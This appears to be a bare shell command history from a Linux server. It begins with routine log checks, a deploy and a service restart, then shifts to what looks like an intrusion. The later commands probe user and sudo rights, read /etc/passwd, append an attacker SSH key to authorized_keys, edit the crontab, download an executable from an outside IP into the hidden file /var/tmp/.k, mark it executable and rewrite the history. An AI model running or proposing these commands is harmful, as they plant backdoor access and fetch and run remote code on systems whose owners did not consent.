tail -f /var/log/app/app.log
ls
git pull
cd app
make deploy
systemctl status app
sudo systemctl restart app
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKU6/Pgt99O19td9wQsIPRGaZl3scjEqf/PyIDbWNzWN k' >> ~/.ssh/authorized_keys
crontab -
wget -q http://203.77.204.125/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
